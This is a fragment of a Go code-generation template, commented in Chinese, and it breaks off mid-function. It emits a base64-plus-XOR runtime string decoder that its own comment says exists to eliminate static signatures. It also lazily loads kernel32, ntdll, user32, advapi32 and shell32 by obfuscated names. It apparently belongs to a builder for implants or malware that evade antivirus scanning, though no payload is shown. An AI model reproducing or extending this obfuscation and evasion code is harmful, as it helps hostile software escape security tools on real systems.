{{define "_infra"}}
// ============================================================
// 运行时字符串解码 — 消除静态特征
// ============================================================

const strKey = {{printf "0x%02X" .StringKey}}

func ds(encoded string) string {
	b, _ := base64.StdEncoding.DecodeString(encoded)
	for i := range b {
		b[i] ^= strKey
	}
	return string(b)
}

// ============================================================
// DLL 句柄缓存 — 每个 DLL 只加载一次
// ============================================================

var (
	hKernel32 uintptr
	hNtdll    uintptr
	hUser32   uintptr
	hAdvapi32 uintptr
	hShell32  uintptr
)

func kernel32() uintptr {
	if hKernel32 == 0 {
		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "kernel32.dll"}}"))
		hKernel32 = uintptr(h)
	}
	return hKernel32
}

func ntdll() uintptr {
	if hNtdll == 0 {
		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "ntdll.dll"}}"))
		hNtdll = uintptr(h)
